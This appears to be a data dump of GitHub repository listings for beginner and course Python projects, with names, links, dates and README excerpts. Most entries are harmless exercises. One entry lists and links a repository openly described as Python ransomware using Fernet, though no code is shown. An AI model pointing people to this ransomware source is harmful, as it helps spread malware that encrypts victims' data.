417287940;Password-Program-with-Python;https://github.com/Awesomeplayer165/Password-Program-with-Python;;2021-10-14T21:31:37Z;0;0;0;"Password-Program-with-Python About Password program will ask for a password and check against a set of rules. It will repetitively ask for a password until all rules are met. The first two rules have been programmed.  Now, it's your turn to program each rule from #3 to #7. Rules  At least 12 characters Should have numbers Should have special characters Capital letters Lower case letters Should not include your name Should not have the name password  Create two additional rules of your own. Starting Code: TOTAL_NUMBER_OF_RULES = 2 #total number of rules going to be checked NUMBERS = ""0123456789"" SPECIALCHARACTERS = ""!@#$%^&*()""  rulesMet = 0 #count the number of rules met by the password given  while rulesMet != TOTAL_NUMBER_OF_RULES:     password = input(""Please give me a password: "")     rulesMet = 0 #reset the number of rules met      #rule 1     if len(password)>=12:         print(""Good work!  Your password has enough characters."")         rulesMet += 1     else:         print(""It's too short! Has to contain at least 12 characters"")      #rule 2     found = False      for n in NUMBERS:         if n in password:             rulesMet += 1             print(""Good work!  Your password contains a number."")             found = True             break     if found == False:         print(""Your password does not contain a number."")          "
417272237;Simple-Python-Dice;https://github.com/GreenAppleCode/Simple-Python-Dice;Python;2021-10-14T20:24:51Z;0;0;0;
417307119;Python_GUI_with_Tkinter;https://github.com/mikeecuffe/Python_GUI_with_Tkinter;Python;2021-10-14T23:07:24Z;0;0;0;
417233586;Python-II-Classes-Application;https://github.com/Astr0isgarb/Python-II-Classes-Application;Jupyter Notebook;2021-10-14T18:02:20Z;0;0;0;
417252648;Python_SelemniumPOMproject;https://github.com/TexasVoloshin/Python_SelemniumPOMproject;Python;2021-10-14T19:08:57Z;0;0;0;
417243292;autoinstrumented-python-app;https://github.com/harnitsignalfx/autoinstrumented-python-app;Python;2021-10-14T18:35:43Z;0;0;0;"autoinstrumented-python-app An otel autoinstrumented python app Python Flask app that listens on /request and port 6001 and returns the text ""OK"". E.g. Docker run with env variables - docker run -it --rm -e OTEL_TRACES_EXPORTER=jaeger-thrift-splunk -e OTEL_EXPORTER_JAEGER_ENDPOINT=https://ingest..signalfx.com/v2/trace -e SPLUNK_ACCESS_TOKEN= -e OTEL_PROPAGATORS=b3multi -e OTEL_RESOURCE_ATTRIBUTES=deployment.environment=istio,service.name=test-py-listener --name my-sender -p 6001:6001 harnit/istio-flask-listener:1.0 "
417256639;electron-python-template;https://github.com/phanirithvij/electron-python-template;;2021-10-14T19:23:33Z;0;0;0;
417229912;mini-python-project;https://github.com/Santoshluitel2/mini-python-project;Jupyter Notebook;2021-10-14T17:50:14Z;0;0;0;
417278067;machinelearning_python_rest_api;https://github.com/realmohan001/machinelearning_python_rest_api;Jupyter Notebook;2021-10-14T20:49:00Z;0;0;0;"machinelearning_python_rest_api  It is a python based REST API, deployed to Heroku platform. It uses Machine Language(ML) to predict the provisions needed to be loaded, based on the passenger count. The Machine language(ML) model is trained with historical data. Once trained the model is saved as joblib(flight-provision.joblib) object. The model is trained with data in Jupyter notebook ""jupyter_notebook.ipynb"", and is saved as ""flight-provision.joblib"". The model is trained with the data in ""flight_provision.csv"" file. It uses python ""pandas"", ""sklearn"" and ""decision tree"" python libraries. The joblib model is being used in the REST API(app.py). It takes the passenger count as input and returns the provisions needed. This is developed for Demo.  "
417217287;DiscordBotPython;https://github.com/Konjointed/DiscordBotPython;Python;2021-10-14T17:08:18Z;0;0;0;
417312356;Python-Ransonware-Fernet;https://github.com/CodeVsk/Python-Ransonware-Fernet;Python;2021-10-14T23:37:03Z;1;1;0;Fernet Ransonware Python 👾  More Informations  Use Fernet Library  Project python Fernet Ransonware. Developed by CodeVSK 
417277332;demo-teradata-python;https://github.com/acirtep/demo-teradata-python;Python;2021-10-14T20:45:57Z;0;0;0;demo-teradata-python How to use Teradata in Python  Place the TTU download in the directory of the repo Follow: https://medium.com/@petrica.leuca/when-2-powers-meet-teradata-and-python-a3cef1e35362  
417308390;Billetera-Virtual-Python;https://github.com/AlexDTrujillo/Billetera-Virtual-Python;Python;2021-10-14T23:14:05Z;0;0;0;
417251703;Python---Samsung-Ocean;https://github.com/vitoria2002campos/Python---Samsung-Ocean;;2021-10-14T19:05:50Z;0;0;0;
417253647;Pearson-Coefficient-using-Python;https://github.com/ismaelabdisalaam/Pearson-Coefficient-using-Python;Jupyter Notebook;2021-10-14T19:12:19Z;0;0;0;Using the Pearson correlation coefficient to quantify the relationship between price and the other variables In this project we are determining which variable has the strongest correlation with price. The dataset used is obtained from the UCI Machine learning Depository.The Automobile Data Set. It is a data set that includes technical information and price data for cars from the year 1985. After formating the dataset, a exploratory data analysis is done on the dataset and then finally calcuating the Correlation Coeffiecient. Project skills: Data Cleaning,analysis and visualisation Packages used in this project: Pandas,Numpy,Seaborn and Scipy Results We find price has the strongest correlation with Engine size. 
417273546;list-in-python;https://github.com/SinghS1129/list-in-python;;2021-10-14T20:30:09Z;0;0;0;list-in-python 
417249422;da_python_course;https://github.com/mameneses11/da_python_course;Python;2021-10-14T18:58:09Z;0;0;0;
417232835;K-python-class-03;https://github.com/mdrashedulhasan1/K-python-class-03;Jupyter Notebook;2021-10-14T18:00:09Z;0;0;0;K-python-class-03 
417311712;Python-Review---Part-1;https://github.com/rmalik14/Python-Review---Part-1;Jupyter Notebook;2021-10-14T23:33:23Z;0;0;0;Python-Review---Part-1 
417197056;python-django-google-api;https://github.com/lucasviera22/python-django-google-api;;2021-10-14T16:05:31Z;0;0;0;python-django-google-api Project using Python Django and Google APIs 
417274783;python-bot-example;https://github.com/happyenderman10/python-bot-example;Python;2021-10-14T20:35:08Z;0;0;0;💠A simple python bot :   ⚡ To get started : Follow this steps :   1 - Go to Replit 2 - Make a repl  3 - Put any name and Select python  4 - Click on Shell  5 - Type git clone https://github.com/happyenderman10/python-bot-example  6 - Type cd python-bot-example/  7 - Change the variables  On main.py after clicking on the folder  8 - After that Type pip install discord To install The modules  9 - When you install the modules and you change the variables  You can type python main.py  ---> And your bot is ready! 
417300070;Serial-Arduino-Python;https://github.com/GullinoAgus/Serial-Arduino-Python;Python;2021-10-14T22:30:52Z;0;0;0;Serial-Arduino-Python Serial communicator with python for arduino 
417278337;python-flask-playground;https://github.com/fedeth/python-flask-playground;Python;2021-10-14T20:50:15Z;0;0;0;Python and Flask simple API A simple Python playground in which I tried to explore Flask basics. Note and usage  Use venv and Python 3.9 (!important) Use pip to install Flask  To initialize the DB and run the server:  $ python run.py You will see the result on: localhost:5000 
417308393;Python-Api-Challenge;https://github.com/jameslfuller/Python-Api-Challenge;Jupyter Notebook;2021-10-14T23:14:06Z;0;0;0;Python-Api-Challenge 
417205548;python_tests1;https://github.com/itword7111/python_tests1;Python;2021-10-14T16:31:48Z;0;0;0;
417241348;python_aqa_education_kucherov;https://github.com/CuprumShot/python_aqa_education_kucherov;Python;2021-10-14T18:28:58Z;0;0;0;Kir Kucherov Oleksii Rubel 
417257158;Python-T1;https://github.com/iznor/Python-T1;Python;2021-10-14T19:25:25Z;0;0;0;
417228243;Simpel-Python-calculator;https://github.com/Athenaazar/Simpel-Python-calculator;Python;2021-10-14T17:44:31Z;0;0;0;"Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32 Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.    https://github.com/Athenaazar/Simpel-Python-calculator.git File """", line 1 https://github.com/Athenaazar/Simpel-Python-calculator.git ^ SyntaxError: invalid syntax users/simple-calculator_with_gui-main/Dekstop Traceback (most recent call last): File """", line 1, in  NameError: name 'users' is not defined    "
417251445;BreakfastChatBot;https://github.com/erick-rui/BreakfastChatBot;Python;2021-10-14T19:04:56Z;0;0;0;BreakfastChatBot Python Chatbot 
417301380;apsoftware;https://github.com/albertorodriguezdiaz/apsoftware;Python;2021-10-14T22:37:37Z;1;1;0;
417208157;30_Days_Leetcode;https://github.com/pranjalijain2509/30_Days_Leetcode;;2021-10-14T16:40:31Z;0;0;0;30_Days_Leetcode Python code 
417313895;Python-Review---Part-1---Tizazu;https://github.com/Selamelaku/Python-Review---Part-1---Tizazu;Jupyter Notebook;2021-10-14T23:45:40Z;0;0;0;Python-Review---Part-1---Tizazu 
417258632;Try-Except-Exception-Handling-python;https://github.com/ASJADSYED08/Try-Except-Exception-Handling-python;Python;2021-10-14T19:31:04Z;0;0;0;
417219489;realpython-primer-on-python-decorators;https://github.com/josenaldo/realpython-primer-on-python-decorators;;2021-10-14T17:15:16Z;0;0;0;primer-on-python-decorators 
417251278;SNEHA-SURENDRAN-pythoncode-Bassam-Infotech;https://github.com/7863782829/SNEHA-SURENDRAN-pythoncode-Bassam-Infotech;Python;2021-10-14T19:04:22Z;1;1;0;
417249945;Comp.Python_VPL10-Pandas;https://github.com/victorcesarts/Comp.Python_VPL10-Pandas;Python;2021-10-14T19:00:10Z;0;0;0;"Pandas (Esses exercícios/códigos fazem parte do curso ""Composição de Programas em Python"" oferecido pelo DCC/UFMG) def numRows(games):     """"""The number of rows in the games table.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  def numColumns(games):     """"""The number of columns in the games table.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  def numGoldTotal(games):     """"""The total number of gold medals in any olympic game.      The total number of gold medals includes the total number of gold medals     in the summer and in the winter olympic games. All the countries must be     considered, when computing this total.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  def numSummerGoldCountry(games, country):     """"""The number of gold medals won by country in the summer olympics.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     games: str         The country that we are considering in this query.     """"""  def getCodeMaxSummerGold(games):     """"""The code of the country with the most golds in the summer olympics.      The country code is a string formed by three upper-case letters, in the     'Code' column of the input table. We are interested in just one code: the     code of the country that won more golds.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  def getNthBestSummerCountry(games, n):     """"""The N-th country in the rank of the summer olympics.      Countries must be ordered first by the number of gold medals; then by the     number of silver medals, and then by the number of bronze medals. If the     countries have the same number of gold, silver and bronze medals, then     they are ordered alphabetically.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     n: int         The index that we want in the rank.     """"""  def numCountriesWithMoreThanNWinterMedals(games, n):     """"""The number of countries that won strictly more than n medals of any kind.      We are interested in only countries that won _more_ than n medals. This     total considers gold, silver and bronze medals. We consider only medals in     the Winter Olympics.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     n: int         The number of medals that we consider as a threshold.     """"""  def numWinterCountries(games):     """"""The number of countries that won more than average in the winter games.      A Winter Country is a country that won more gold medals than the average     number of gold medals won in the winter olympics. We are considering     strictly more gold medals, meaning that if a country won exactly the     average, then it is not a winter country.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  def countGoldsWithLetter(games, c):     """"""Number of gold medals won by countries that start with a given letter.      This function filters out the countries that start with a given letter,     and then count the number of gold medals won by those countries in the     Summer Olympics.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     c: str         The letter that must start the name of the countries that are         considered.     """"""  def countHybernalCountries(games):     """"""Num of countries with no less medals in the winter games.      This function counts the number of countries that won more (or the same     number) total medals in the winter olympics than in the summer olympics.     Remember: equality is not strict. Countries that won the same number of     medals in both olympics are considered hybernal countries.      Parameters     ----------     games: DataFrame         The table with results from Olympic Games, organized by country.     """"""  "
417261659;C-Users-Rodol-Desktop-python;https://github.com/Rodolfo9-ca/C-Users-Rodol-Desktop-python;;2021-10-14T19:42:57Z;0;0;0;
417305708;Sindoni-Python-Review-Part-1;https://github.com/ArmandSindoni/Sindoni-Python-Review-Part-1;Jupyter Notebook;2021-10-14T23:00:34Z;0;0;0;Sindoni-Python-Review-Part-1 
417289975;level-0-coding-challenges-python;https://github.com/Kenneth-bit/level-0-coding-challenges-python;Python;2021-10-14T21:41:36Z;0;0;0;"Level 0 Coding Challenges flavour : Python    Task Objective     0.1 convert pseudocode into real code.   0.2 convert pseudocode into real code.   0.3 write a function named hello, it needs to take in a string as an argument.   0.4 write a function named even_or_odd your function should take an integer and print in the word “even” or “odd”.   0.5 Write a function that takes in three numbers. These numbers represent the lengths of the sides of a triangle. The function should return the area of a triangle.   0.6 Write a function that takes in three numbers and returns the maximum number. Do this without using any builtin methods. Write your own logic from scratch.The function should expect a bunch of numbers, not an array or list.   0.6 Bonus how can you change the code so it can take in any number of numbers? Do this without using builtin methods. Write your own logic from scratch. Again, the function should expect a bunch of numbers as input, not an array or list. Please do not write a whole new function. Upgrade your existing function.   0.7 Write a function that takes in a number representing the temperature in Celsius and returns the temperature in Fahrenheit. Write another function that does the opposite (Fahrenheit to Celsius).   0.8 Make a function to convert any number into hours and minutes. (For example, 71 will become “1 hour, 11 minutes; 133 will become “2 hours, 13 minutes.) Most people get this question wrong. Make sure you handle singulars and plurals for both hours and minutes.   0.9 Write a function that takes in a string and then prints out all the vowels in the string. Make sure it can deal with capital letters and small letters. For example, Input: ""Umuzi"", Output: Vowels: u, i.   0.10 Make a function that takes two strings as input, and outputs the common characters/letters that they share. (For example, Input: ‘house’, ‘computers’ . Output: ‘Common letters: o, u, e, s’).    Author : Kenneth MM "
417312751;Python-Review-Submission-1-2;https://github.com/ntsupa/Python-Review-Submission-1-2;Jupyter Notebook;2021-10-14T23:39:15Z;0;0;0;Python-Review-Submission 1-2 
417289183;ML-with-python-from-scratch;https://github.com/byamasu-patrick/ML-with-python-from-scratch;Jupyter Notebook;2021-10-14T21:37:32Z;0;0;0;
417296510;python_flask-feedback-login-registration-;https://github.com/SandroSandroo/python_flask-feedback-login-registration-;Python;2021-10-14T22:12:20Z;0;0;0;
417203298;tutorial-Imagens-python-PYBR2021;https://github.com/ramondomiingos/tutorial-Imagens-python-PYBR2021;Python;2021-10-14T16:24:33Z;0;0;0;"Tutorial :  Manipulando Imagens da webCam com Python - PYBR2021 Tutorial apresentado na #PyBR2021 com o título Manipulando Imagens da  webcam com Python no dia 17 de outubro, as 15h; Repositório criado com o intuito de compartilhar os exemplos e receber contribuição dos participantes  com outros exemplos de filtros para processamento de imagem.  Sejam bem vindos!  Pessoas > Tecnologia Material:  Slides da apresentação Documentação OpenCV Documentação NumPy Gimp  Como Contribuir: Existe filtros que podem ser adicionados a imagens exemplos:  Blur Gauss Sobel - Detecção de Bordas Laplace Negativo   Adicione uma pasta ( caso não exista ) com o nome do filtro e um exemplo de codigo seguindo o padrão: filtro_autor.py ( ex: gauss_ramon.py)  "
417284358;BreakPython_Data-analysis-study;https://github.com/minseochoi-AI/BreakPython_Data-analysis-study;Jupyter Notebook;2021-10-14T21:15:11Z;0;0;0; 🤔파뿌리가 뭔가요? 한국산업기술대(Korea Polytechnic University)의 재능기부 비교과 프로그램(3기)  🧐무엇을 배우나요?  파이썬 기초와 데이터를 다루는 자료구조 학습! 깃허브의 저장,사용법을 배우며 자신의 학습한 내용을 관리 할 수 있는 능력 함양! 파이썬의 다양한 라이브러리(Pandas,Matplotlib,Seoborn)등을 이용해 데이터를 가공하고 인사이트를 도출하는 방법 학습!  📁 Assignment 💡-2주차 -변수,함수 입출력 https://github.com/minseochoi-AI/BreakPython_Data-analysis-study/blob/main/1weeks_minseo.ipynb -과제 출처 https://github.com/koptimizer/Python_Breakers/blob/master/season3/quest/2%EC%A3%BC%EC%B0%A8%ED%80%98%EC%8A%A4%ED%8A%B8.md 💡-3주차 -함수응용,정규표현식과 입출력 https://github.com/minseochoi-AI/BreakPython_Data-analysis-study/blob/main/3weeks_minseo.ipynb -과제 출처 https://github.com/koptimizer/Python_Breakers/blob/master/season3/quest/3%EC%A3%BC%EC%B0%A8%ED%80%98%EC%8A%A4%ED%8A%B8.md 💡-5주차 -데이터 프레임 조작,csv 및 xlsx 파일 사용법 https://github.com/minseochoi-AI/BreakPython_Data-analysis-study/blob/main/5weeks_minseo.ipynb -과제 출처 https://github.com/koptimizer/Python_Breakers/blob/master/season3/quest/5%EC%A3%BC%EC%B0%A8%ED%80%98%EC%8A%A4%ED%8A%B8.md 💡-7주차 -데이터 분석 및 시각화 https://github.com/minseochoi-AI/BreakPython_Data-analysis-study/blob/main/7weeks_minseo.ipynb -과제 출처 https://github.com/koptimizer/Python_Breakers/blob/master/season3/quest/7%EC%A3%BC%EC%B0%A8%ED%80%98%EC%8A%A4%ED%8A%B8.md 💡-8주차 -복습 https://github.com/minseochoi-AI/BreakPython_Data-analysis-study/blob/main/8weeks_minseo.ipynb 
417241098;Course-on-Python-by-Stepik;https://github.com/ellinashurovsk/Course-on-Python-by-Stepik;Python;2021-10-14T18:28:09Z;0;0;0;"Программирование на Python Курс ""Программирование на Python"" от Института биоинформатики   Week 1: Операторы. Переменные. Типы данных. Условия.   1.8: Переменные. Стандартный ввод/вывод  1.9: Логические операции, операции сравнения  1.10: Условия: if, else, elif. Блоки, отступы  1.11: Строки  1.12: Задачи по материалам недели    Week 2: Циклы. Строки. Списки.   2.1: Цикл while  2.2: Операторы break, continue  2.3: Цикл for  2.4: Строки и символы  2.5: Списки  2.6: Задачи по материалам недели    Week 3: Функции. Словари. Интерпретатор. Файлы. Модули.   3.1: Функции  3.2: Словари  3.3: Интерпретатор: установка, запуск скрипта  3.4: Файловый ввод/вывод  3.5: Модули, подключение модулей  3.6: Установка дополнительных модулей  3.7: Задачи по материалам недели  3.8: Библиотеки для анализа данных. NumPy  3.9: Библиотека Matplotlib    https://stepik.org/course/67/syllabus "
417305712;Python-Function-and-LaTex;https://github.com/BrennanPalmieri/Python-Function-and-LaTex;Jupyter Notebook;2021-10-14T23:00:35Z;0;0;0;
417257119;Testpython;https://github.com/Firehound13/Testpython;Jupyter Notebook;2021-10-14T19:25:16Z;0;0;0;
417281229;sup;https://github.com/kukampa/sup;;2021-10-14T21:01:53Z;0;0;0;
417276930;Celery-Redis;https://github.com/siyamak1981/Celery-Redis;;2021-10-14T20:44:15Z;1;1;0;Celery-Redis Python Celery Redis 
417210460;Project-1-GAT;https://github.com/saitouhikaru64/Project-1-GAT;Jupyter Notebook;2021-10-14T16:47:37Z;0;0;0;
417214310;pyneng;https://github.com/svds90/pyneng;Python;2021-10-14T16:59:36Z;0;0;0;"Задания и примеры из книги ""Python для сетевых инженеров""     Все примеры и задания были проверены на Python 3.7 и 3.8. Как создать свой репозиторий для выполнения заданий  Подробнее о работе с Git и Github в книге  Создание репозитория на GitHub Для создания своего репозитория на основе шаблона нужно:  залогиниться на GitHub открыть репозиторий с заданиями нажать ""Use this template"" и создать новый репозиторий на основе этого шаблона в открывшемся окне надо ввести название репозитория после этого готов новый репозиторий с копией всех файлов из исходного репозитория с заданиями   Клонирование репозитория с GitHub Для локальной работы с репозиторием его нужно клонировать. Для этого используется команда git clone: $ git clone git@github.com:natenka/pyneng-examples-exercises.git Cloning into 'pyneng-examples-exercises'... remote: Counting objects: 241, done. remote: Compressing objects: 100% (191/191), done. remote: Total 241 (delta 43), reused 239 (delta 41), pack-reused 0 Receiving objects: 100% (241/241), 119.60 KiB | 0 bytes/s, done. Resolving deltas: 100% (43/43), done. Checking connectivity... done.  По сравнению с приведённой в этом листинге командой, вам нужно изменить:  имя пользователя natenka на имя своего пользователя на GitHub; имя репозитория pyneng-examples-exercises на имя своего репозитория на GitHub.  В итоге, в текущем каталоге, в котором была выполнена команда git clone, появится каталог с именем репозитория, в моём случае – ""pyneng-examples-exercises"". В этом каталоге теперь находится содержимое репозитория на GitHub. Виртуалки Для курса подготовлены два варианта виртуальных машин: vmware и Vagrant. По ссылке есть инструкции для каждого варианта, а также инструкция по выполнению заданий на Windows:  https://pyneng.github.io/docs/course-vm/  Задания В каталоге exercises находятся задания к курсу, отсортированные по разделам курса. Кроме того, там находятся все вспомогательные файлы (конфигурации и др), которые используются в заданиях.  Если в заданиях раздела есть задания с буквами (например, 5.2a), то можно выполнить сначала задания без букв, а затем с буквами. Задания с буквами, как правило, немного сложнее заданий без букв и развивают/усложняют идею в соответствующем задании без буквы. Например, если в разделе есть задания: 5.1, 5.2, 5.2a, 5.2b, 5.3, 5.3a. Сначала, можно выполнить задания 5.1, 5.2, 5.3. А затем 5.2a, 5.2b, 5.3a. Однако, если задания с буквами получается сделать сразу, можно делать их по порядку.  Тесты Начиная с раздела «9. Функции» для проверки заданий есть автоматические тесты. Они помогают проверить все ли соответствует поставленной задаче, а также дают обратный отклик по тому, что не соответствует задаче. Как правило, после первого периода адаптации к тестам, становится проще делать задания с тестами.  Как работать с тестами и основы pytest  "
417278989;Olympic-Data-Analysis;https://github.com/shashank-kala/Olympic-Data-Analysis;Python;2021-10-14T20:52:51Z;0;0;0;
417290902;StonePaperAndScissorGame;https://github.com/riyasinghbdn/StonePaperAndScissorGame;Python;2021-10-14T21:45:54Z;0;0;0;
417197918;MealPlanner;https://github.com/PranavG71004/MealPlanner;Python;2021-10-14T16:08:15Z;0;0;0;MealPlanner Python Assignment - Meal Planner 
417202830;polito_info_primo;https://github.com/andreacarpinato/polito_info_primo;;2021-10-14T16:23:00Z;0;0;0;polito_info_primo Repository with python exercises 
417253514;hangman;https://github.com/carvalho-fdec/hangman;;2021-10-14T19:11:50Z;0;0;0;hangman Hangman game using python 
417287264;Pyscrape;https://github.com/CraziCoda/Pyscrape;Python;2021-10-14T21:28:43Z;0;0;0;Pyscrape Simple Python Scrapper 
417206229;autotest_examples;https://github.com/elemmiriel/autotest_examples;Python;2021-10-14T16:33:59Z;0;0;0;
417213670;Len-Slice;https://github.com/Boateng24/Len-Slice;Python;2021-10-14T16:57:37Z;0;0;0;Len-Slice Codecademy python list project 
417210687;Data-Science-Learning;https://github.com/tran-haison/Data-Science-Learning;Jupyter Notebook;2021-10-14T16:48:22Z;0;0;0;Data-Science-Learning Python Regex, Pandas & NumPy 
417221526;desafios;https://github.com/MauricioOliveira30/desafios;Python;2021-10-14T17:22:09Z;0;0;0;
417303095;Desafio_PokemonGo;https://github.com/thiagorbo/Desafio_PokemonGo;Python;2021-10-14T22:46:48Z;0;0;0;
417241144;pytar1;https://github.com/liranmi2/pytar1;;2021-10-14T18:28:19Z;0;0;0;
417214262;learning-py;https://github.com/WilliamTheConcatenator/learning-py;;2021-10-14T16:59:29Z;0;0;0;
417206327;pyfrac;https://github.com/MUYUTwilighter/pyfrac;Python;2021-10-14T16:34:22Z;0;0;0;"Pyfrac Fractions in python Description Add fraction to python, along with a lot of operations. This is coded by a student major in Network Engineering, may not be of high quality Use 1.Download ""fractions.py"" 2.put the file under the same directory with your .py 3.use ""from fractions import *"" to import the class Manual See ""example.py"" to get more information "
417279172;AmazonWebscraper;https://github.com/BrandonSager/AmazonWebscraper;Jupyter Notebook;2021-10-14T20:53:38Z;0;0;0;Amazon Webscraper Created a webscraper that retrieves the price of a popular laptop on Amazon once per day. 
417227769;hello;https://github.com/andriy-code/hello;HTML;2021-10-14T17:42:59Z;0;0;0;
417255011;tutorial-pybr;https://github.com/marinadfs/tutorial-pybr;;2021-10-14T19:17:22Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417203546;Project-7;https://github.com/MarisaFye/Project-7;;2021-10-14T16:25:24Z;0;0;0;Project-7 Counting Chickens Python 
417245015;Netzplan;https://github.com/SebastianMeisel/Netzplan;Python;2021-10-14T18:41:58Z;0;0;0;
417251736;Activity_2;https://github.com/sachandasethunga/Activity_2;;2021-10-14T19:05:57Z;0;0;0;
417282276;waypoint;https://github.com/amickael/waypoint;Python;2021-10-14T21:06:00Z;0;0;0;
417238893;Scrapping;https://github.com/SoftManager-P/Scrapping;Python;2021-10-14T18:20:33Z;0;0;0;"""# Scrapping"" "
417210831;py-flask-tutorial;https://github.com/em-gazelle/py-flask-tutorial;Python;2021-10-14T16:48:49Z;0;0;0;py-flask-tutorial Python Flask Tutorial App 
417260068;Matrix-Solver;https://github.com/Allyn-Bao/Matrix-Solver;Python;2021-10-14T19:36:36Z;0;0;0;
417254713;manipulacaoDoBancoDeDadosEmPython;https://github.com/MateusLopesNunes/manipulacaoDoBancoDeDadosEmPython;Python;2021-10-14T19:16:10Z;0;0;0;
417282684;Data-Visualization-Projects-with-Python-Libraries;https://github.com/sirb2/Data-Visualization-Projects-with-Python-Libraries;Jupyter Notebook;2021-10-14T21:07:45Z;0;0;0;
417237759;MIS2100-Chapter7-Python-Project;https://github.com/djheidem/MIS2100-Chapter7-Python-Project;;2021-10-14T18:16:37Z;0;0;0;
417240021;Week-2-Applied-Machine-Learning-in-Python;https://github.com/rajatstats/Week-2-Applied-Machine-Learning-in-Python;Jupyter Notebook;2021-10-14T18:24:17Z;0;0;0;Week-2-Advanced-Python-for-Machine-Learning 
417200738;ICS3U-Unit5-03-Python;https://github.com/Seti-Ngabo/ICS3U-Unit5-03-Python;Python;2021-10-14T16:16:55Z;0;0;0;ICS3U-Unit5-03-Python  
417285761;Python-2---Module-1-Exercise.ipynb;https://github.com/Mamofm/Python-2---Module-1-Exercise.ipynb;Jupyter Notebook;2021-10-14T21:21:32Z;0;0;0;Python-2---Module-1-Exercise.ipynb first commit 
417293497;int-python-react-junk-tracker-3000;https://github.com/spbk/int-python-react-junk-tracker-3000;JavaScript;2021-10-14T21:58:19Z;0;0;0;"Junk Tracker 3000 You have been hired to build an inventory management system for your local junkyard! While they accept may different items, old vehicles are their most valuable, so they want to keep better track of all the different ones they have. Tasks  Allow for four different vehicle types (listed below) to be created and edited.  For each Vehicle type, only display the relevant fields to the user  For example: If a a Coupe is being created/edited, do not show the ""Automatic sliding doors"" field.   Use backend/src/database.py as a stubbed out database service to persist objects. It'll be wiped out each time you restart the backend, but should be sufficiet for our purposes.   After each vehicle is created, register it using the VehicleRegistrationService (at backend/src/vehicle_registration_service.py) and permanently associate that registration ID with the vehicle. List all vehicles on http://localhost:4200/vehicles with their type, nickname, mileage rating and registration ID  mileage rating is defined as:  low: mileage < 10,000 medium: 10,000 <= mileage < 100,000 high: 100,000 <= mileage      Vehicle Types  Sedan  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-4, default: 4 Engine status: works, fixable, junk, default: works   Coupe  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-2, default: 2 Engine status: works, fixable, junk, default: works   Mini-Van  Nickname: string Mileage: integer Wheels: 0-4, default: 4 Doors: 0-4, default: 4  For each door: (Tip: Make sure everything else is working before addressing this)  Sliding: boolean, default: false     Engine status: works, fixable, junk, default: works   Motorcycle  Nickname: string Mileage: integer Wheels: 0-2, default: 2 Engine status: works, fixable, junk, default: works Seat status: works, fixable, junk, default: works    Guildelines Please don't spend more than two (2) hours on this project! The goal is not to add every bell, whistle, feature and optimization that you can think of. The goal is to both see an example of working code that you write and see how you do implementing realistic (albeit contrived...) features. You will be judged on how accurately you complete the above tasks and the quality of the code you write. The backend has some routes stubbed out and the frontend has been initialized via Create React App. You are free to make any and all changes you'd like to complete the assignment. Getting Started See SETUP.md for instructions on how to get your development envrionment working. If you have any questions, especially regarding setup, please contact us so we can get it sorted out ASAP! When you are finished, push all changes to the repo on GitHub and email us that you've finished! Feel free to to open a pull request or leave any other comments on specific commits or the repo as you see fit. Notes  If you have any issues at all, especially with getting your development environment working, please reach out to us ASAP. Our intention isn't to make you troubleshoot an existing project's configuration. (You wouldn't spend the majority of your work day doing that in real life). We are more than happy to do that for you! Make your first priority getting everything to work! Do not worry about server-side rendering of any JavaScript React components Add any additional Python pckages, npm modules or other tools you'd like  "
417250478;Python-At-IAC-Tic-Tac-Toe;https://github.com/tramypham2192/Python-At-IAC-Tic-Tac-Toe;;2021-10-14T19:01:46Z;0;0;0;
417217834;fCC-Data_Analysis_with_Python;https://github.com/DrJohnR/fCC-Data_Analysis_with_Python;Jupyter Notebook;2021-10-14T17:10:12Z;0;0;0;"fCC-Data_Analysis_with_Python Projects completed in fulfilment of the requirements for the freeCodeCamp certification ""Data Analysis with Python"", details of each project available at: https://www.freecodecamp.org/learn/data-analysis-with-python/ Certificate and submitted files (hosted by Replit.com) available at: https://www.freecodecamp.org/certification/fcc31c590b9-3cb8-48f0-9630-187180d2c1cd/data-analysis-with-python-v7 "
417235616;Python-how-old-im-am-in-2021;https://github.com/EdwardVukovac/Python-how-old-im-am-in-2021;;2021-10-14T18:09:18Z;0;0;0;Python-how-old-im-am-in-2021 The program tells how old you are 
417231297;Automate-the-Boring-Stuff-with-Python;https://github.com/ptambriz/Automate-the-Boring-Stuff-with-Python;;2021-10-14T17:54:58Z;0;0;0;Automate-the-Boring-Stuff-with-Python Automate the Boring Stuff with Python # Practical Programming for Total Beginners If you've ever spent hours renaming files or updating hundreds of spreadsheet cells, you know how tedious tasks like these can be. But what if you could have your computer do them for you? In Automate the Boring Stuff with Python, you'll learn how to use Python to write programs that do in minutes what would take you hours to do by hand - no prior programming experience required. Once you've mastered the basics of programming, you'll create Python programs that effortlessly perform useful and impressive feats of automation to: - Search for text in a file or across multiple files - Create, update, move, and rename files and folders - Search the Web and download online content - Update and format data in Excel spreadsheets of any size - Split, merge, watermark, and encrypt PDFs - Send reminder emails and text notifications - Fill out online forms  Step-by-step instructions walk you through each program, and practice projects at the end of each chapter challenge you to improve those programs and use your newfound skills to automate similar tasks. Don't spend your time doing work a well-trained monkey could do. Even if you've never written a line of code, you can make your computer do the grunt work. Learn how in Automate the Boring Stuff with Python. 
417203991;fCC-Scientific_Computing_with_Python;https://github.com/DrJohnR/fCC-Scientific_Computing_with_Python;Python;2021-10-14T16:27:00Z;0;0;0;"fCC-Scientific_Computing_with_Python Projects completed in fulfilment of the requirements for the freeCodeCamp certification ""Scientific Computing with Python"", details of each project available at: https://www.freecodecamp.org/learn/scientific-computing-with-python/ Certificate and submitted files (hosted by Replit.com) available at: https://www.freecodecamp.org/certification/fcc31c590b9-3cb8-48f0-9630-187180d2c1cd/scientific-computing-with-python-v7 "
